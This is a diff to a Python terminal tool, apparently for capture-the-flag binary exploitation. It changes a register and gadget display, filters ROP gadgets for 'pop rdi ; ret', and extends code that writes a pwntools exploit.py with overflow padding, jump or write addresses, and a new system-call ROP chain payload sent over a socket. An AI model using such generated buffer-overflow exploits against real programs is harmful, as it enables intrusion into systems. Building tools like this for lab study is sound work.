@@ -161,12 +161,12 @@ def dispMenu():
       print('\u2551' + " " + colored(RE,colour7) + " " +  '\u2551', end=' ')
    else:
       print('\u2551' + " " + colored(RE,colour6) + " " +  '\u2551', end=' ')
-   if SRT in FUNC[0]:
+   if (SRT.rstrip(" ") in FUNC[0]):
       print(colored(FUNC[0],colour3), end=' ')
    else:
       print(colored(FUNC[0],colour6), end=' ')   
    print('\u2551', end=' ')   
-   print(colored(GADD[0],colour6), end=' ')
+   print(colored(GADD[0],colour3), end=' ')
    print('\u2551')      
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
    print('\u2551' + " RBX/EBX/BX/BH " + '\u2551', end=' ')
@@ -183,7 +183,7 @@ def dispMenu():
       else:
          print(colored(ST ,colour6), end=' ')      
    print('\u2551', end=' ')
-   if SRT.rstrip(" ") in FUNC[1]:
+   if (SRT.rstrip(" ") in FUNC[1]):
       print(colored(FUNC[1],colour3), end=' ')
    else:
       print(colored(FUNC[1],colour6), end=' ')   
@@ -200,7 +200,7 @@ def dispMenu():
       print('\u2551' + " " + colored(FO,colour7) + " " +  '\u2551', end=' ')
    else:
       print('\u2551' + " " + colored(FO,colour6) + " " +  '\u2551', end=' ')   
-   if SRT.rstrip(" ") in FUNC[2]:
+   if (SRT.rstrip(" ") in FUNC[2]):
       print(colored(FUNC[2],colour3), end=' ')
    else:
       print(colored(FUNC[2],colour6), end=' ')   
@@ -222,7 +222,7 @@ def dispMenu():
       else:
          print(colored(NX,colour6), end=' ')            
    print('\u2551', end=' ')      
-   if SRT.rstrip(" ") in FUNC[3]:
+   if (SRT.rstrip(" ") in FUNC[3]):
       print(colored(FUNC[3],colour3), end=' ')
    else:
       print(colored(FUNC[3],colour6), end=' ')   
@@ -244,7 +244,7 @@ def dispMenu():
       else:
          print(colored(PI ,colour6), end=' ')         
    print('\u2551', end=' ')
-   if SRT.rstrip(" ") in FUNC[4]:
+   if (SRT.rstrip(" ") in FUNC[4]):
       print(colored(FUNC[4],colour3), end=' ')
    else:
       print(colored(FUNC[4],colour6), end=' ')   
@@ -266,7 +266,7 @@ def dispMenu():
       else:
          print(colored(RW,colour6), end=' ')            
    print('\u2551', end=' ')   
-   if SRT.rstrip(" ") in FUNC[5]:
+   if (SRT.rstrip(" ") in FUNC[5]):
       print(colored(FUNC[5],colour3), end=' ')
    else:
       print(colored(FUNC[5],colour6), end=' ')   
@@ -288,7 +288,7 @@ def dispMenu():
    else:
       print(colored("OFFSET   " + OFF[:9],colour2), end=' ')
       print('\u2551', end=' ')            
-   if SRT.rstrip(" ") in FUNC[6]:
+   if (SRT.rstrip(" ") in FUNC[6]):
       print(colored(FUNC[6],colour3), end=' ')
    else:
       print(colored(FUNC[6],colour6), end=' ')   
@@ -311,7 +311,7 @@ def dispMenu():
    if BITS[:7] == "unknown":
       print(colored("         0 Bytes  ",colour7), end=' ')
    print('\u2551', end=' ')   
-   if SRT.rstrip(" ") in FUNC[7]:
+   if (SRT.rstrip(" ") in FUNC[7]):
       print(colored(FUNC[7],colour3), end=' ')
    else:
       print(colored(FUNC[7],colour6), end=' ')   
@@ -338,7 +338,7 @@ def dispMenu():
    if BITS[:7] == "unknown":
       print(colored("         0 Bytes  ",colour7), end=' ')
    print('\u2551', end=' ')   
-   if SRT.rstrip(" ") in FUNC[8]:
+   if (SRT.rstrip(" ") in FUNC[8]):
       print(colored(FUNC[8],colour3), end=' ')
    else:
       print(colored(FUNC[8],colour6), end=' ')      
@@ -357,7 +357,7 @@ def dispMenu():
    else:
       print(colored("-"*COL1,colour2), end=' ')
    print('\u2551', end=' ')   
-   if SRT.rstrip(" ") in FUNC[9]:
+   if (SRT.rstrip(" ") in FUNC[9]): 
       print(colored(FUNC[9],colour3), end=' ')
    else:
       print(colored(FUNC[9],colour6), end=' ')      
@@ -380,7 +380,7 @@ def dispMenu():
    else:
       print(colored(OFF2[:9],colour2),end=' ')   
    print('\u2551', end= ' ')
-   if SRT.rstrip(" ") in FUNC[10]:
+   if (SRT.rstrip(" ") in FUNC[10]):
       print(colored(FUNC[10],colour3), end=' ')
    else:
       print(colored(FUNC[10],colour6), end=' ')   
@@ -395,7 +395,7 @@ def dispMenu():
       print(colored(JMP,colour6), end=' ')
    print('\u2551', end=' ') 
    print("                   " + '\u2551', end= ' ') 
-   if SRT.rstrip(" ") in FUNC[11]:
+   if (SRT.rstrip(" ") in FUNC[11]):
       print(colored(FUNC[11],colour3), end=' ')
    else:
       print(colored(FUNC[11],colour6), end=' ')   
@@ -410,7 +410,7 @@ def dispMenu():
       print(colored(CUS,colour6), end=' ')
    print('\u2551', end=' ')  
    print("                   " + '\u2551', end= ' ') 
-   if SRT.rstrip(" ") in FUNC[12]:
+   if (SRT.rstrip(" ") in FUNC[12]):
       print(colored(FUNC[12],colour3), end=' ')
    else:
       if FUNC[13] != "":
@@ -460,7 +460,7 @@ def options():
    print(colored(flavour[:5],colour6),end=' ' )
    print((" ")*8 + '\u2551')
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + "(06) Set DESTIN INDEX (16) Examine  Program (26) Read Intamixed (36) Set Buffer OFFSET (46) RESERVED     " + '\u2551' + " BITS           ", end=' ')
+   print('\u2551' + "(06) Set DESTIN INDEX (16) Examine  Program (26) Read Assembley (36) Set Buffer OFFSET (46) RESERVED     " + '\u2551' + " BITS           ", end=' ')
    if BITS[:1] != "u":
       print(colored(BITS,colour6), end=' ')
    else:
@@ -1235,10 +1235,20 @@ while True:
          cutLine("Unique gadgets","gadgets.tmp")
          gadgNum = lineCount("gadgets.tmp")
          gadgNum = spacePadding(str(gadgNum),7)
-         with open("gadgets.tmp","r") as gadgets:
+         
+         command("cat gadgets.tmp | grep 'pop rdi ; ret' > pop.tmp")
+         counter = lineCount("pop.tmp")
+         if counter > 0:
+            command("cat pop.tmp > full.tmp")
+            command("echo '--------------------------------------------------------' >> full.tmp")
+            command("cat gadgets.tmp >> full.tmp")    
+         
+         with open("full.tmp","r") as gadgets:
             for x in range (0, maxDispl):
                GADD[x] = gadgets.readline().rstrip(" ")
                GADD[x] = spacePadding(GADD[x], COL3)
+               if x == 0:
+                  RDI = GADD[x].split(" ")[0].rstrip(" ")
          command("mv gadgets.tmp " + localDir + "/gadgets.txt")
       prompt()
    
@@ -1347,6 +1357,7 @@ while True:
          command("objdump" + " -D -S " + localDir + "/" + FIL.rstrip(" ") + " > code.tmp")
          parsFile("code.tmp")
          catsFile("code.tmp")
+         
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
@@ -1728,7 +1739,7 @@ while True:
          command("echo 'from pwn import *' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 'context.clear()' >> " + localDir + "/exploit.py")
-         command("echo 'context.log_level = \"debug\" # debug' >> " + localDir + "/exploit.py")
+         command("echo 'context.log_level = \"debug\"' >> " + localDir + "/exploit.py")
          command("echo 'context.binary = \"./" + FIL.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")         
          command("echo '' >> " + localDir + "/exploit.py")         
          if COM[:3] == "ELF":
@@ -1752,7 +1763,7 @@ while True:
          command("echo 'RCX = p64(" + RCX.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'RDX = p64(" + RDX.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'RSI = p64(" + RSI.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'RDI = p64(" + RDI.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+         command("echo 'RDI = p64(" + RDI.rstrip(" ") + ") # pop rdi ; ret' >> " + localDir + "/exploit.py")
          command("echo 'RSP = p64(" + RSP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'RBP = p64(" + RBP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'RIP = p64(" + RIP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
@@ -1760,33 +1771,33 @@ while True:
          command("echo 'start = p64(" + SRT.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'main  = p64(" + MAN.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'jump  = p64(" + JMP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'rewrite  = p64(" + CUS.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+         command("echo 'write = p64(" + CUS.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
          if OFF2[:1] == "0":
             command("echo 'offset = " + OFF.rstrip(" ").replace("Bytes","") + "' >> " + localDir + "/exploit.py")
          else:
             command("echo 'offset = " + OFF2.rstrip(" ").replace("Bytes","") + "' >> " + localDir + "/exploit.py")         
-         command("echo 'buffers = \"a\" * offset' >> " + localDir + "/exploit.py")
-         command("echo 'integer = \"b\" * 4' >> " + localDir + "/exploit.py")
-         if BITS[:2] == "64":
-            command("echo 'pointer = \"c\" * 8' >> "+ localDir + "/exploit.py")
-         else:
-            command("echo 'pointer = \"c\" * 4' >> "+ localDir + "/exploit.py")         
-         command("echo 'padding = \"d\" * 4' >> "+ localDir + "/exploit.py")  
-         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo 'padding = \"a\" * offset' >> " + localDir + "/exploit.py")
          command("echo 'terminate = \"\\\\n\"' >> " + localDir + "/exploit.py")         
-         command("echo '' >> " + localDir + "/exploit.py")
-         if JMP.rstrip(" ") == "0x0000000000000000":
-           switch = 2
-         else:
-           switch = 1
+         command("echo '' >> " + localDir + "/exploit.py")         
+         if JMP.rstrip(" ") != "0x0000000000000000":
+           switch = 1           
+         if CUS.rstrip(" ") != "":
+           switch = 2        
          command("echo 'switch = " + str(switch) + "' >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py")                    
          command("echo 'if switch == 1:' >> " + localDir + "/exploit.py")
-         command("echo '   payload = flat(buffers,jump,terminate)' >> " + localDir + "/exploit.py")
+         command("echo '   payload = flat(padding,jump,terminate)' >> " + localDir + "/exploit.py")
          command("echo '#   print(payload)' >> " + localDir + "/exploit.py")
-         command("echo 'else:' >> " + localDir + "/exploit.py")
-         command("echo '   payload = flat(buffers,rewrite,terminate)' >> "  + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo 'if switch == 2:' >> " + localDir + "/exploit.py")
+         command("echo '   payload = flat(padding,write,terminate)' >> "  + localDir + "/exploit.py")
          command("echo '#   print(payload)' >> " + localDir + "/exploit.py")         
+         command("echo '' >> " + localDir + "/exploit.py")           
+         command("echo 'if switch == 3:' >> " + localDir + "/exploit.py")
+         command("echo '   payload = flat(padding,RDI,system,jump,terminate)' >> "  + localDir + "/exploit.py")
+         command("echo '#   print(payload)' >> " + localDir + "/exploit.py")         
+         command("echo '' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
          command("echo 's.send(payload)' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
